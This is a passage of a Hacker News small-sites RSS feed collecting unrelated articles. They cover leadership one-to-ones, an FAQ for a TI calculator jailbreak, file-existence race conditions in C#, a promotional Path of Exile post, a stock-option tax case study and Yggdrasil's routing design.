<p>In my intro, I gave a potted career history. Starting from my degree in philosophy, and my first career in <a href="https://www.barringtonstoke.co.uk/">children’s book publishing</a>, through teaching myself to code, my <a href="https://www.hw.ac.uk/study/uk/postgraduate/information-technology-software-systems.htm">masters in Software Systems</a> and then my 15+ year career in programming, infrastructure and operations, technical architecture, and my previous role as <a href="https://www.annashipman.co.uk/jfdi/a-year-in-the-life-os-lead.html">Open Source lead</a>. I also talked about what appealed to me about the job as Technical Director at the FT.</p>

<p>I said roughly the same thing to everyone. I don’t normally introduce myself and give my background, but in this case I thought that as a new Tech Director most of them would not be working closely with me, and I would not be contributing code, so it was worth giving my credentials.</p>

<p>My mentor had suggested I also say something personal. I think he intended something like “married with two children” (or whatever), but instead, I tried to give a different kind of personal detail, something about my interests. I tried to come up with a different one for each conversation, for example something about my <a href="https://twitter.com/annashipman/status/1043917006477643777">cross-stitch hobby</a>.</p>

<p>This part was the hardest part for me, because prior to this I had generally enjoyed keeping a clear boundary between work stuff and personal stuff, so that definitely didn’t cover talking about cross-stitch, or my home life, on a first meeting. However, I had been trying to bring more of my personal self to work, and this part of the intro did lead to some really interesting conversations and I think helped make a better connection.</p>

<p>Of course, these days, when we are all at home, my personal life is in meetings with me, so it’s good I’d already started on that journey!</p>

<p>Giving so much information in my introduction also allowed the other person to introduce themselves how they wanted. Some talked career history, some focused on their hobbies, others were really open about their lives and aspirations.</p>

<h2 id="i-am-so-glad-i-did-this">I am so glad I did this</h2>

<p>My mentor was wrong about one thing –&nbsp;none of the conversations were boring.</p>

<p>In my first few months in the new job, I often felt really stretched for time, but I never regretted a single one of these meetings; it was always extremely interesting, my team are brilliant and it was great to meet them one on one, and each conversation always contained some valuable information.</p>

<p>There were two very valuable things about this for me.</p>

<p>The first was getting an idea of what change was needed. These meetings gave me a brilliant insight that wasn’t available elsewhere. Patterns started emerging very quickly, and formed the basis of our <a href="https://medium.com/ft-product-technology/the-difficult-teenage-years-setting-tech-strategy-after-a-launch-7f42eb94a424">tech strategy</a>.</p>

<p>The second was building relationships. A lot of the people I had 1:1s with I would not have come into contact with during the course of the ordinary working week. It would have taken time to meet everyone at socials, and it wouldn’t have been the same quality of conversation. I still feel, two years on, that I know a bit about all the people I had those conversations with, which has felt to me like a good foundation for our subsequent conversations.</p>

<p>It was also good, as someone who is a bit shy, to have names to faces quite quickly and people to say hello to when walking round the office.</p>

<h2 id="was-it-useful-for-my-team">Was it useful for my team?</h2>

<p>About a year later, I asked some of the people with whom I’d had these conversations whether they’d been useful (in an anonymous form).</p>

<p>All of the people who responded said they found the conversation valuable, and some of their comments were:</p>

<ul>
  <li>“It broke down barriers and helped me feel less intimidated about approaching you, whether to talk about work or just to have a general chit chat. You are a very busy person who I wouldn’t ever work with directly so it was good to feel that you knew I existed.”</li>
  <li>“There is hardly any opportunity for me to talk to people in higher position like you except when the team has a big problem. The 1:1 was really casual and I felt really comfortable talking to you. It was a good time to know what kind of person you are. If we didn’t do the 1:1, the answer of the question below “Do you feel able to raise issues with me?” would be “No”.”</li>
  <li>“We sat down when you first started and it was nice to get some one-to-one time because it’s not often you get to do that with a Technical Director. It was nice to raise issues but for me, it was more of an opportunity to understand if I could trust you in the future with raising issues. Raising issues can be difficult and scary so it’s important to know if the person you are raising them to is receptive.”</li>
  <li>“It really showed that you cared about us as humans, and how we fit with the rest of the team. It was also a great opportunity to get to know you”</li>
  <li>“I think often of that conversation”</li>
</ul>

<h2 id="did-it-make-them-feel-more-able-to-raise-issues-with-me">Did it make them feel more able to raise issues with me?</h2>
</div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.annashipman.co.uk/jfdi/meeting-everyone.html">https://www.annashipman.co.uk/jfdi/meeting-everyone.html</a></em></p>]]>
            </description>
            <link>https://www.annashipman.co.uk/jfdi/meeting-everyone.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512527</guid>
            <pubDate>Fri, 18 Sep 2020 02:59:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[ArTIfiCE is a jailbreak for TI CE calculators]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512502">thread link</a>) | @bane
<br/>
September 17, 2020 | https://yvantt.github.io/arTIfiCE/ | <a href="https://web.archive.org/web/*/https://yvantt.github.io/arTIfiCE/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="faqDiv">
                                    <p>Great question! A more detailed answer will make its way onto this page later on, but in summary: it gives back to users their legitimate right to enjoy a feature they paid for that TI unilaterally removed in the latest OS versions (allegedly for security reasons, but the bug that cheaters could in theory use was from TI and had nothing to do with ASM!)</p>

                                    <p>Delete the arTIfiCE appvar from the Memory menu (<tt>2nd</tt>+<tt>+</tt>). Depending on what you need to do, you may also want to delete any installed shell and trigger a RAM Reset as well (be sure to archive and/or backup your files first)</p>

                                    <p>Most probably not, considering arTIfiCE only executes a small piece of assembly code (which was previously possible in earlier OSes), and doesn't install anything persistent. Simply fully reset your calc and there will be no trace of it.</p>

                                    <p>arTIfiCE uses software bugs in the calculator's code to be able to execute assembly. A light "shell" is run allowing you to choose which program to launch. The source code may become available later on GitHub.</p>

                                    <p>Most likely, but many other bugs have been found that future versions of arTIfiCE may use :)</p>

                                    <p>No - arTIfiCE only restores functionality TI calculators had for dozens of years and removed in the latest OS. arTIfiCE is in no way a cheating tool, and cheating is not condoned here in any way.</p>

                                    <p>No - arTIfiCE resides in an "appvar" file (Application Variable, an 8xv file) and it will be deleted by the OS when going into Press-To-Test mode, just like most other appvars. You'll have to re-transfer+open it after your exam.</p>

                                    <p>No, or at least not directly: arTIfiCE only makes it possible for you to launch ASM programs, that's it. So you'd have to find a downgrade program for that (search for it on the usual websites).</p>

                                    <p>Sure, from the arTIfiCE shell, you can install another shell, for instance <a href="https://github.com/mateoconlechuga/cesium/releases/latest" target="_blank">Cesium</a>, which can be opened more quickly (thus you get to launch your programs more easily).</p>

                                    <p>Alright... The underlying exploit has a codename. In fact, all the underlying exploits found so far have fun codenames. They'll be released in due time :D</p>
                                </div></div>]]>
            </description>
            <link>https://yvantt.github.io/arTIfiCE/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512502</guid>
            <pubDate>Fri, 18 Sep 2020 02:55:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The File System is Unpredictable (2009)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24512405">thread link</a>) | @azhenley
<br/>
September 17, 2020 | https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html | <a href="https://web.archive.org/web/*/https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>One of the more frequent questions I answer on StackOverflow is a variation of the following.</p>

<blockquote>
  <p>I’m doing XXX with a file, how can I know if the file exists?</p>
</blockquote>

<p>The variations include verify no one else has the file open, if the file is in use, the file is not writable, etc ‘. The answer to all of these questions is unfortunately the same. Simply put you can’t. The reason why is the fundamental nature of the file system prevents such predictive operations.</p>

<p>The file system is a resource with multiple levels of control that is shared between all users and processes in the system. The levels of control include but are not limited to file system and sharing permissions. At <strong>any</strong> point in time any entity on the computer may change a file system object or it’s controls in any number of ways. For example</p>

<ul>
  <li>The file could be deleted</li>
  <li>A file could be created at place one previously did not exist</li>
  <li>Permissions could change on the file in such a way that the current process does not have access</li>
  <li>Another process could open the file in such a way that is not conducive to sharing</li>
  <li>The user remove the USB key containing the file</li>
  <li>The network connection to the mapped drive could get disconnected</li>
</ul>

<p>Or in short</p>

<blockquote>
  <p>The file system is best viewed as a multi-threaded object over which you have no reliable synchronization capabilities</p>
</blockquote>

<p>Many developers, and APIs for that matter, though treat the file system as though it’s a static resource and assume what’s true at one point in time will be true later. Essentially using the result of one operation to predict the success or failure of another. This ignores the possibility of the above actions interweaving in between calls. It leads to code which reads well but executes badly in scenarios where more than one entity is changing the file system.</p>

<p>These problems are best demonstrated by a quick sample. Lets keep it simple and take a stab at a question I’ve seen a few times. The challenge is to write a function which returns all of the text from a file if it exists and an empty string if it does not. To simplify this problem lets assume permissions are not an issue, paths are properly formatted, paths point to local drives and people aren’t randomly ripping out USB keys. Using the System.IO.File APIs we may construct the following solution.</p>

<div><div><pre><code><span>static</span> <span>string</span> <span>ReadTextOrEmpty</span><span>(</span><span>string</span> <span>path</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span><span>File</span><span>.</span><span>Exists</span><span>(</span><span>path</span><span>))</span> <span>{</span>
        <span>return</span> <span>File</span><span>.</span><span>ReadAllText</span><span>(</span><span>path</span><span>);</span> <span>// Bug!!!</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This code reads great and at a glance looks correct but is actually fundamentally flawed. The reason why is the code changes depends on the call to File.Exist to be true for a large portion of the function. It’s being used to predict the success of the call to ReadAllText. However there is nothing stopping the file from being deleted in between these two calls. In that case the call to File.ReadAllText would throw a FileNotFoundException which is exactly what the API is trying to prevent!</p>

<p>This code is flawed because it’s attempting to use one piece of data to make a prediction about the future state of the file system. This is simply not possible with the way the file system is designed. It’s a shared resource with no reliable synchronization mechanism. File.Exists is much better named as File.ExistedInTheRecentPast (the name gets much worse if you consider the impact of permissions).</p>

<p>Knowing this, how could we write ReadTextOrEmpty in a reliable fashion’ Even though you can not make predictions on the file system the failures of operations is a finite set. So instead of attempting to predict successful conditions for the method, why not just execute the operation and deal with the consequences of failure?</p>

<div><div><pre><code><span>static</span> <span>string</span> <span>ReadTextOrEmpty</span><span>(</span><span>string</span> <span>path</span><span>)</span> <span>{</span>
    <span>try</span> <span>{</span>
        <span>return</span> <span>File</span><span>.</span><span>ReadAllText</span><span>(</span><span>path</span><span>);</span>
    <span>}</span> <span>catch</span> <span>(</span><span>DirectoryNotFoundException</span><span>)</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span> <span>catch</span> <span>(</span><span>FileNotFoundException</span><span>)</span> <span>{</span>
        <span>return</span> <span>String</span><span>.</span><span>Empty</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>This implementation provides the original requested behavior. In the case the file exists, for the duration of the operation, it returns the text of the file and if not returns an empty string.</p>

<p>In general I find the above pattern is the best way to approach the file system. Do the operations you want and deal with the consequences of failure in the form of exceptions. To do anything else involves an unreliable prediction in which you still must handle the resulting exceptions.</p>

<p>If this is the case then why have File.Exist at all if the results can’t be trusted’ It depends on the level of reliability you want to achieve. In production programs I flag any File.Exist I find as a bug because reliability is a critical component. However you’ll see my personal powershell configuration scripts littered with calls to File.Exsit. Simply put because I’m a bit lazy in those scripts because critical reliability is not important when I’m updating my personal .vimrc file.</p>


    </div></div>]]>
            </description>
            <link>https://blog.paranoidcoding.com/2009/12/10/the-file-system-is-unpredictable.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512405</guid>
            <pubDate>Fri, 18 Sep 2020 02:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Path of Exile (Poe) Is a Worth Playing MMO – Five Reasons to Explain That]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24512371">thread link</a>) | @ChrisPineson
<br/>
September 17, 2020 | https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/ | <a href="https://web.archive.org/web/*/https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>You need to log in to create posts and topics.</p><div id="postid-1170"><div><div><p><a href="http://www.google.ae/url?q=https://eznpc.com/poe-currency"><img title="" src="https://lh3.googleusercontent.com/YpEB1sT8hT6WU2pqviNhZVrv6z-WZp3Z6jvQnf_j6nkLccp6FsKfkM_CqLaPX1rjOuTZsYJuwQAehpJYYBDm1N-aSyseDP6it2c2QZEibf9VkuK8d9dRWChdbapahCFE8WTwmo89CVw6CGxhBy76bWA9zFNrpcxoSdlLWvFLZZG0kDuQPClDlAGcvYcMj2pZs2we9cpCYY7VgjJo2hLGlltKfNtcYDvxGhkEGJn9zXeUstBfQ7c3Nx-E04j3as71baOyd1W4IrJ1S3UIw82ppje4TXzKmkZDfK2rsHuSMpKayTpt6mQ-MJYtJuwbTpmaDm589Wg03sIu7SttnBMEFSjoesCWSJ6RLTOm0nQzK2lo4np3VlaMU0pdjLYVU0t_uEpLp8iG-R7YSHep-wwCo5MQriXBxdy8N6tILdDT-Lk8xWc239hh9OPc3tMie1cJwk2MNX6QPFQjmeTDy6XDnrmJQOhiYxzx3AV_vmdt1bC0rmeDDdkHu0CLX87B_vLwTGxMYGxGe-bvKkHMGK9YbprrJOkphF-P88nDl5oZnQHwz4HdCuEGh5MsSpK-01JGce3Ghozj1h6aM99t0cAaY2WishVRakVfcfyvYBNSVwoCziSqnmztk-TVa50oQN-npAq3aAdkOvZ-hUqXsmGg8AsMwDaBbWntxJklPwNoA6tSrxCz52GS7EHO96Sp=w657-h329-no?authuser=0" alt="Why You Should Play Path of Exile" width="657" height="328"></a>As we all know the Path of Exile has been available for a very quite long time. Several days ago, they just launched their brand new and Free Delirium Expansion which concentrate on sending players off the grid to carve out a brand new section with passive skill and then encounter the worst nightmares over there and finally let players earn <a href="https://eznpc.com/poe-chaos-orb">PoE orbs</a>&nbsp;and Path of Exile Currency after finish this expansion successfully. Needless to say, a lot of unexpected things are certainly going on in this game. If you are now thinking of turning away from this game just because of the way it looks or the way it feels, then we recommend you to not do it! Cause, in fact, Path of Exile is a quite great ARPG (Action Role-Playing Game) that really deserves the praise and accolades it get from the online gaming community and now, here are five reasons for you to at least consider trying this out!</p>
<p>The very first one is: <strong>This Game Is Free To Play</strong></p>
<p>Who does not like Free Games? Even better, who does not like Free Games that are really excellent? Though Path of Exile offers some optional microtransactions (they have to earn money one way or the other after all), this game is totally free to download and play! Of course, it got off to a quite difficult start when the developer Grinding Gear Game (GGG) launched it firstly, but with tons of expansions, tweaks, and feedback from players, this game has improved drastically and now holds the torch as the best action role-playing video games to date. I have to admit that this game has set the standard that every other game of the same genre should follow!</p>
<p>The second one is: <strong>This Game Has Tons Of Content</strong></p>
<p>Here comes the question, if there's just one thing that Path of Exile is famous for, what would that be? For me, I might answer, that's the vast amount of content PoE has available. This game now has been successfully out for eight years, which means that it's packed full of great content. Though the developer Grinding Gear Games (GGG) has a reputation of sometimes rushing content (the Betrayal League is a great example of that) filled with glaring errors, the fact of the matter is you will be spoiled with so much stuff to do. And you have to admit that most of their expansions are top-notch, and you can sink your teeth into this endgame content easily for hours.</p>
<p>The third one is: <strong>This Game Has Awesome Developer Support</strong></p>
<p>The developer Grinding Gear Games (GGG) of Path of Exile, is always dedicated to continuously improving their game. They are always pushing for updates, from some minor patches every month to some big ones named Leagues. These Leagues give brand new methods to play this game, new loot to discover, and new skin to collect. If that's not enough to entice you into trying out Path of Exile, these Leagues come about 3-4 months! And the developer Grinding Gear Games (GGG) seems to want to ensure that their beloved game lasts forever, therefore, they consistently find unique methods to innovate upon what's have already there. Anyway, there's always something to look forward to!</p>
<p>The fourth one is: <strong>Guide Are Always Available In Path Of Exile</strong></p>
<p>Are you have trouble when choosing which melee equipment you need to use? Or maybe you are a little confused about the skill tree's use? You can find guides all over the Internet pretty easily, and that is mainly thanks to the tight-knit Path of Exile community! Wiki builds are abundant and new guides pop up almost every day. Whether it is a YouTube video to help you with power leveling or just in-depth written guides about all of the expansions, you should know there are plenty of guides to make your Exile in Wraeclast so much easier than before.</p>
<p>The community of Path of Exile is just insanely helpful, particularly to those new starters who are just figuring out this game. It's difficult to find fun games anymore as most are filled with toxicity (checking out League of Legends and DOTA 2). Here people will welcome you with just open arms, and if you are coming from games that are plagued with those toxic communities, then you will be taken aback by how nice everybody is on Path of Exile.</p>
<p>The fifth one is: <strong>This Is A Unique Game</strong></p>
<p>As you know, in most RPGs (Role-Playing Games), you just need to pick a class and the designate skill points to whichever stats you want to increase. Generally, you are just locked into a particular style of play. That is not the case in Path of Exile. Your skills and abilities are just linked to skill gems that are socketed into your very own gear, from your helmet to your boots. And now these gems will apply different abilities to your gear just depending on which you select. Path of Exile pushes players to personalize their own characters with the help of the massive skill tree and hundreds of gems to choose from. No role-playing game has ever implemented this kind of customization yet, making Path of Exile a quite unique experience unlike any other.</p>
<p>And above are our five reasons why you should start playing Path of Exile. Okay now, have we already convinced you to try and farm some rare items such as PoE orbs and <a href="https://eznpc.com/poe-currency">buy PoE currency online</a>&nbsp;for fun? If you are not, just post your comments down below and let us know why.</p>
</div>    </div>
</div><div id="postid-1181"><div><p><img alt="" src="https://secure.gravatar.com/avatar/bae48a4fafec9af9cb0512fbed819bc0?s=120&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/bae48a4fafec9af9cb0512fbed819bc0?s=240&amp;d=mm&amp;r=g 2x" height="120" width="120"></p><div><p><span><a href="https://www.awow-tech.com/forum/profile/dreamzweddingplanner2/">dreamzweddingplanner2</a></span><span>(@dreamzweddingplanner2)</span></p></div><p><small>3 Posts</small></p></div><div><div><p>looking for the Best wedding or an event planner to Organize a wedding or a party in udaipur, delhi, agra, India</p>
<p><a href="https://www.dreamzweddingplanner.com/services/wedding-planning/">Event planner</a></p>
</div>    </div>
</div></div>]]>
            </description>
            <link>https://www.awow-tech.com/forum/topic/reasons-of-path-of-exile-why-you-really-need-to-play-path-of-exile/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512371</guid>
            <pubDate>Fri, 18 Sep 2020 02:34:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Snowflake case-study in exercising stock options for startup employees]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512368">thread link</a>) | @yashevde
<br/>
September 17, 2020 | https://www.secfi.com/blog/snowflake-case-study | <a href="https://web.archive.org/web/*/https://www.secfi.com/blog/snowflake-case-study">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Congrats to all Snowflake employees 🥳</h2><p>Yesterday was Snowflake's IPO. The first day of trading has ended and shares are now trading $250+.</p><p>Employees who built the company have to be excited. Of course the share price will change before they can sell their shares (there's the usual lock-up period), but it looks like there will be a good outcome. </p><p>Unfortunately, employees who didn't exercise their stock options likely left a lot of money on the table.</p><h2>Extra congrats to those who exercised early on</h2><p>The big decision: when should an employee exercise their stock options? </p><p>It's the million dollar question. It's also difficult to answer as there are lots of implications, and unsurprisingly most end up defaulting to doing nothing. </p><p>Unfortunately, that can be a suboptimal decision. Stock options – particularly ISOs – can have huge tax benefits if you exercise early. Assuming your company (and 409A) continues to grow, exercising earlier means:</p><ul role="list"><li>Less tax on exercise</li><li>Less tax after IPO</li></ul><p>That's because your taxes at sale get converted to long-term capital gains, which is a lower tax rate. (As long as you meet the holding requirements:&nbsp;sell at least one year after exercising your ISOs, and at least two years after your employer granted them).</p><h2>A case study</h2><p>Let's use rounded/estimated numbers here. Note that this is all just illustrative.</p><p>Employees who started at Snowflake in 2018 likely all have incentive stock options (ISOs) at a &lt;$5 strike price. Say Employee A at Snowflake is granted 5,000 ISOs at $5 strike price.</p><h2>Costs to exercise, initially:&nbsp;$53,405 😬</h2><p>Fastforward to mid-2020 and assume the <a href="https://www.secfi.com/what-is/409a-valuation">409A valuation</a> is $30. Employee A would now need to pay $25k to Snowflake for the strike price and ~$28k in taxes for a total of $53k.<br></p><figure id="w-node-e8fbfeecda30-7cbb9235"><p><img src="https://assets.website-files.com/5e8c4317ac31d90b3792a24b/5f634ccc66e6453c03ff3785_EiEXcHdU8AErwKS.png" loading="lazy" alt=""></p><figcaption>Assumptions: CA resident, married filing jointly, $200k base income</figcaption></figure><h2>Costs to exercise, couple weeks ago:&nbsp;$144,514 🤒</h2><p>If Employee A waited to exercise until the first IPO pricing of $80 a couple weeks ago. Then the tax bill jumps up to ~$119k.</p><figure id="w-node-43d260fd1c16-7cbb9235"><p><img src="https://assets.website-files.com/5e8c4317ac31d90b3792a24b/5f634ced887cf80f7071c557_EiEXqckUcAAVp6_.png" loading="lazy" alt=""></p></figure><h2>Costs to exercise, now:&nbsp;$472,462 🥵</h2><p>You probably know what's coming next. If Employee A waited until today to exercise at the $250 public price, then the tax bill goes up to ~$447k.</p><figure id="w-node-146ceabb6f6e-7cbb9235"><p><img src="https://assets.website-files.com/5e8c4317ac31d90b3792a24b/5f634cfcd60f177495cd5d00_EiEXPa2U4AA77Ds.png" loading="lazy" alt=""></p></figure><p>Stock options get more and more expensive to exercise. After an IPO, most will have to resort to doing what's called a cashless exercise which means you buy and sell your shares in same transaction. </p><p>It's cashless because you don't need cash upfront:&nbsp;you can cover the exercise costs with your sale proceeds. Taxwise though, this is the worst scenario. You'll pay ordinary income rates (=high)&nbsp;on ALL gains. </p><h2>Tax savings due to exercising:&nbsp;~$135,000 💸</h2><p>So why would anyone volunteer to pay cash to exercise ISOs prior to IPO? </p><p>If you exercise and hold on to your equity for two years after grant and&nbsp;one year after exercise, you sell in a so-called 'qualifying disposition' and convert everything north of your strike to long-term capital gains tax rates (=low). <br></p><p>Let's say Employee A decided to exercise in mid-2020 when the 409A was $30. She pays $53k then waits a year before selling after IPO. If we assume the share price will be $250 when the lock-up period ends in a couple of months, she converts her gain to long-term capital gains and gets an extra ~$135k in her pocket. In other words, she's 20% better off 🥳 </p><figure id="w-node-40c676eee5e8-7cbb9235"><p><img src="https://assets.website-files.com/5e8c4317ac31d90b3792a24b/5f634d19b903ad5ef89362d8_EiEf0iTVkAEINM3.png" loading="lazy" alt=""></p></figure><p>By the way, that extra ~$135k is with the $53k exercise costs already factored in. So it's all additional profit.</p><h2>Moral of the story: think about exercising early on </h2><p>Don't just wait and see. Each IPO is bittersweet. I'm always happy for the employees, but I also talk to many who realize how much they left on the table. After each IPO, I always hear the same thing: </p><p>"Wish I'd exercised years ago."</p><p>Stock options and taxes are complicated, and startup valuations are uncertain. Most startup employees do not feel well equipped to make these decisions. Investment risk, available cash, personal situations, ability to leave job, etc. all play a factor. Planning ahead allows you to anticipate these risks and avoid (some of) the costs.<br></p><p>So startup employees: Make sure you're being conscious about your stock options. Know the potential risks and benefits from exercising. If you don't know, talk to an advisor or people that do know. There's too much money on the table to ignore.</p><p>Feel free to hit me up for a quick chat in the bottom-right if you've got any questions. ↘️</p><p><em>Additional resources</em></p><ul role="list"><li><em>Calculator used:&nbsp;</em><a href="https://www.secfi.com/products/exercise-tax-calculator"><em>Exercise Tax Calculator</em></a></li><li><a href="https://www.secfi.com/academy/exercise-guide"><em>A comprehensive guide</em></a><em> on how to decide whether to exercise, and how much to spend</em><a href="https://www.secfi.com/products/options-exercise"><em>‍</em></a></li><li><a href="https://www.secfi.com/blog/planning-for-the-ipo"><em>In-depth article</em></a><em> on how to prepare for the IPO,&nbsp;how long-term capital gains works, and how you can calculate potential savings given your personal numbers</em></li><li><em>If your exercise costs are so high they're unaffordable, there's </em><a href="https://www.secfi.com/products/options-exercise"><em>risk-free financing</em></a><br></li></ul></div></div>]]>
            </description>
            <link>https://www.secfi.com/blog/snowflake-case-study</link>
            <guid isPermaLink="false">hacker-news-small-sites-24512368</guid>
            <pubDate>Fri, 18 Sep 2020 02:33:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The World Tree – Novel Networking Paradigms (2018)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24512311">thread link</a>) | @dfischer
<br/>
September 17, 2020 | https://yggdrasil-network.github.io/2018/07/17/world-tree.html | <a href="https://web.archive.org/web/*/https://yggdrasil-network.github.io/2018/07/17/world-tree.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <header>
        <a href="https://yggdrasil-network.github.io/">  </a>
        <p>End-to-end encrypted IPv6 networking to connect worlds</p>

        <p>
        <a href="https://yggdrasil-network.github.io/">Home</a><br>
        
          
            
              <a href="https://yggdrasil-network.github.io/about.html">About</a><br>
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/admin.html">Admin API</a><br>
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/blog.html">Blog</a><br>
            
          
        
          
            
          
        
          
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/configuration.html">Configuration</a><br>
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/faq.html">FAQ</a><br>
            
          
        
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/installation.html">Installation</a><br>
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
          
        
          
            
              <a href="https://yggdrasil-network.github.io/platforms.html">Platform Notes</a><br>
            
          
        
          
            
          
        
          
            
          
        
          
        
          
            
              <a href="https://yggdrasil-network.github.io/changelog.html">Changelog</a><br>
            
          
        
          
        
          
        
          
        
        </p>

        <p>
        <a href="https://github.com/yggdrasil-network/yggdrasil-go">GitHub</a><br>
        <a href="https://circleci.com/gh/yggdrasil-network/yggdrasil-go">CircleCI</a><br>
        <a href="https://yggdrasil-network.github.io/builds.html">Latest Builds</a><br>
        <a href="https://github.com/yggdrasil-network/public-peers">Public Peers</a><br>
        <a href="https://yggdrasil-network.github.io/services.html">Public Services</a><br>
        </p>

        <p><a href="https://circleci.com/gh/yggdrasil-network/yggdrasil-go"><img src="https://circleci.com/gh/yggdrasil-network/yggdrasil-go.svg?style=shield&amp;circle-token=:circle-token"></a></p>

        
      </header>
      <section>

      
<small>17 July 2018 by Arceliar
  </small>

<h3 id="taboo-trade-offs">Taboo Trade-offs</h3>

<p>I spent a long time thinking about what to write for my first contribution to this blog.
It makes sense for me to cover the gritty details, to try to explain why and how this thing works under the hood, but there’s a lot to go over.
Still, we have to start somewhere, and this seems as good a place as any.</p>

<p>There are things we ideally want a network to do.
We want to find the shortest path between any two nodes in a network.
We want to use as little resources as possible.
We want latency to be as low as possible.
We want as much bandwidth as possible.
We want to minimize packet loss.
We want the network to be fault tolerant, and re-converge as quickly as possible if/when disruptions do occur.
We want security.
We want simplicity.
The list goes on.</p>

<p>Unfortunately, some of these things involve fundamental trade-offs.
Mathematicians have proven, from a pretty inescapable information theory argument, that there’s a trade-off between memory and the efficiency of the paths you can find:
If you want to guarantee memory usage below <code>~O(n^(1/k))</code>, you must accept stretch as high as <code>2k-1</code>.
Similarly, if you want more bandwidth, they you must sometimes use higher-latency paths, and both can get in the way of reliability / low packet loss.</p>

<p>Yggdrasil is an experimental implementation of a number of different ideas.
In this blog post, and likely my next several, I’ll try to go over some of them, but at the end of the day, it’s all about trade-offs.
When seeking to improve performance in one area, we must sometimes make sacrifices in another.
Today’s blog post focuses on Yggdrasil’s routing logic.
On realistic network topologies, we achieve polylogarithmic memory scaling by sacrificing something held sacred in most other routing schemes: shortest path routing.
To explain how and why, I think it’s best if we first review how things are done elsewhere.</p>

<h3 id="hard-cidr">Hard CIDR</h3>

<p>Networks today are built around hierarchically allocated addressing and <a href="https://en.wikipedia.org/wiki/Classless_Inter-Domain_Routing">classless inter-domain routing</a> (CIDR).
The basic idea is to allocate addresses in a network from a contiguous address range, often as small as a <code>/64</code> for IPv6 addresses (a block of addresses with the first 64 bits in common, e.g. <code>1111:2222:3333:4444::/64</code> denotes all addresses from <code>1111:2222:3333:4444:0000:0000:0000:0000</code> to <code>1111:2222:3333:4444:ffff:ffff:ffff:ffff</code>).</p>

<p>A gateway node <code>G</code> in network <code>A</code>, with a connection to another network <code>B</code>, can advertise to network <code>A</code> a route to the address range of network <code>B</code>, and vice versa.
This allows nodes in network <code>A</code> and <code>B</code> to communicate with each other by routing through gateway node <code>G</code>.
This system of gateways, often between a hierarchy of networks with progressively smaller address ranges, is meant to keep routing tables small.</p>

<p>Within a particular network, each node must be able to find a path to every other node within that network.
Virtually all routing schemes in use today are a form of shortest path routing, wherein each node knows the shortest path to every other node in the network, for some definition of path length (such as the number of network hops, latency, some function of bandwidth usage, or often the <a href="https://en.wikipedia.org/wiki/Expected_transmission_count">expected transmission count</a> in mesh networks).
A notable exception to this is Ethernet, which has historically used the <a href="https://en.wikipedia.org/wiki/Spanning_Tree_Protocol">spanning-tree protocol</a> (STP) to reduce a network to a tree topology, in an effort to eliminate routing loops, but newer protocols (such as <a href="https://en.wikipedia.org/wiki/IEEE_802.1aq">shortest path bridging</a>) aim to improve this.
Typically, shortest path routing is implemented either via a proactive protocol, wherein every node in a network maintains a local routing table with information about every other node in the network, or via a reactive protocol using broadcast lookup traffic, wherein routes are found by broadcasting lookups through the entire network.</p>

<p>There are things about this approach which can be problematic.
The main issue, for the purposes of this post, is scalability.
For a large network to scale, it must be subnetted into smaller, more easily manageable networks, which then must in turn be networked together (to form a network of networks from inter-network connections, i.e. the internet).
This requires some level of expertise and planning to do, and tends to favor hierarchies wherein small networks are largely at the mercy of a larger network (e.g. the only connection your LAN has to another network is your connection to an ISP, and “peering” or directly connecting to your neighbor’s LAN is virtually unheard of).
If you don’t subnet efficiently, then large networks can become overloaded by protocol traffic alone.
